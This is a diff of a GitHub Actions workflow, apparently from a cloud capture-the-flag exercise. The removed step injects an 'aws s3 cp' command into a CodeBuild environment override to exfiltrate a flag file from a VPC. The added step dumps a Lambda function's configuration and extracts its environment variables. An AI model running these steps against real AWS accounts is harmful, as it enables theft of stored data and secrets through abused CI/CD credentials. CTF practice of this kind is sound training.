@@ -17,23 +17,13 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: Trigger CodeBuild Inside VPC
+      - name: Dump Lambda Configuration
         run: |
-          echo "=== Triggering CodeBuild to exfiltrate Flag from VPC ==="
+          echo "=== Fetching Lambda Function Configuration ==="
+          aws lambda get-function-configuration --function-name nslookupv2 > lambda_config.json
           
-          # ניסיון הפעלה של ה-CodeBuild עם הזרקת פקודה להדפסת ה-Flag
-          aws codebuild start-build \
-            --project-name codebuild_vpc \
-            --environment-variables-override name=CMD,value="aws s3 cp s3://codec4f26c862a321ef5/flag.txt -",type=PLAINTEXT \
-            > build_output.json || true
-            
-          cat build_output.json || true
+          echo "=== Full Configuration JSON ==="
+          cat lambda_config.json
           
-          # נסרוק את הסטטוס של הריצה במידה והצלחנו להפעיל אותה
-          BUILD_ID=$(jq -r '.build.id' build_output.json 2>/dev/null)
-          if [ ! -z "$BUILD_ID" ] && [ "$BUILD_ID" != "null" ]; then
-            echo "Build started with ID: $BUILD_ID"
-            echo "Waiting for logs..."
-            sleep 30
-            aws codebuild batch-get-builds --ids "$BUILD_ID" || true
-          fi
+          echo "=== Searching for Environment Variables ==="
+          jq '.Environment' lambda_config.json || true
